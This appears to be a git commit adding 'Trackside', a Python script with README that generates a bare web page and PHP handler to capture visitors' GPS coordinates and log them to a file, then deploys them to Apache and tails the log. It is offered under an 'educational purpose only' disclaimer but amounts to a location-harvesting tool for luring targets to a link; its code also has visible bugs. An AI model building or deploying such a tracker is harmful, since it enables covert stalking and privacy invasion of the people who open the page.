6f6c9c8b0c9fbc10402f510f34346323bdb18191
EH30 <games.eh2000@gmail.com>
2019-09-20 12:28:11 +0530

    Add files via upload

---
+++ README.txt
@@ -0,0 +1,27 @@
+Educational purpose only             
+=======================================
+I'm not responsible for your actions 
+
+
+the position is not available unless the user approves it.
+Geolocation is most accurate for devices with GPS, like smartphone.
+As of Chrome 50, the Geolocation API will only work on secure contexts such as HTTPS.
+If your site is hosted on an non-secure origin
+(such as HTTP) the requests to get the users location will no longer function.
+
+
+requirements
+--------------------
+apache server
+python3
+works on https only
+--------------------
+
+
+Run
+----------------------------
+git clone https://github.com/EH30/trackside
+cd Trackside
+python trackside.py
+
+----------------------------
---
+++ trackside.py
@@ -0,0 +1,157 @@
+import os
+import sys
+import time
+
+def check_system():
+    if sys.platform == "linux" or sys.platform == "linux2":
+        os.system("clear")
+        return "linux"
+    elif sys.platform == "win32":
+        os.system("cls")
+        return "win32"
+
+def htmls_clientside():
+    
+    indexfile = """ 
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>EH</title>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    </head>
+
+    <body>
+        <h1>EH</h1>
+        
+        <script type="text/javascript">
+               window.onload=function(){
+                   if(navigator.geolocation)
+                   {
+                       navigator.geolocation.getCurrentPosition(showPosition);
+     s               }
+                    else{
+                        alert("Geolocation is not supported by this browser.");
+                    }
+                }
+                function showPosition(pos){
+                    $.post('saver.php',{'lat':pos.coords.latitude,'lng':pos.coords.longitude},function(res){
+                        console.log(res);
+                    });
+                }
+
+
+        </script>
+    </body>
+</html>
+    """
+    opnr = open("index.html", "w")
+    opnr.write(indexfile)
+    opnr.close()
+
+def server_side():
+    
+    serverfile = """ 
+<?php
+   print_r($_POST);
+   $a = fopen("save.txt", "a");
+   fwrite($a,"Location: $_POST[lat],$_POST[lng]\n=================\n");
+   fclose($a);
+?>
+    """
+    opnr = open("saver.php", "w")
+    opnr.write(serverfile)
+    opnr.close()
+
+def listener(files):
+    try:
+        files.seek(0,2)
+        while True:
+            contents = files.readlines()
+            if not contents:
+                time.sleep(0.1)
+                continue
+            
+            yield contents
+    except FileNotFoundError:
+        time.sleep(10)
+        pass
+
+def cpaste_linux():
+    try:
+        filename = "index.html"
+        writename = "index.html"
+        for i in range(0, 2):
+            opnr = open(filename, "r")
+            data = opnr.read()
+            opnr.close()
+            
+            opnr = open(writename, "w+")
+            opnr.write(data)
+            opnr.close()
+            
+            filename = "saver.php"
+            writename = "saver.php"
+    except FileNotFoundError:
+        return 1
+
+    return 0
+
+def cpaste_windows():
+    try:
+        filename = "index.html"
+        dir_name = str(input("\033[1;32m Enter htdocs Path: \033[1;m"))
+        
+        write_file = dir_name + "/index.html"
+
+        for i in range(0, 2):
+            opnr = open(filename, "r")
+            data = opnr.read()
+            opnr.close()
+            
+            opnr = open(write_file, "w+")
+            opnr.write(data)
+            opnr.close()
+            
+            filename = "saver.php"
+            write_file = dir_name + "/saver.php"
+    except FileNotFoundError:
+        return 1
+
+    return 0
+
+def startscript():
+    check_system()
+    htmls_clientside()
+    server_side()
+
+    if check_system() == "linux":
+        cpaste_linux()
+        if cpaste_linux == 1:
+            print("\033[1;32m move index.html and saver.php to /var/www/ in apache2 \033[1;m")
+            time.sleep(5)
+            os.system("apache2 start")
+            os.system("clear")
+        os.system("clear")
+    
+    elif check_system() == "win32":
+        cpaste_windows()
+        if cpaste_windows == 1:
+            print("\033[1;32m move index.html and saver.php to htdocs in apache and start the apache server\033[1;m")
+            time.sleep(5)
+            os.system("cls")
+        os.system("cls")
+
+if __name__ == "__main__":
+    startscript()
+    file_dir = str(input("\033[1;32m Enter Save.txt Path: \033[1;32m"))
+    count = 0
+    while count < 1:
+        try:
+            log = open(file_dir, "r")
+            count += 1
+            loglines = listener(log)
+            for line in loglines:
+                print (line)
+        except FileNotFoundError:
+            continue
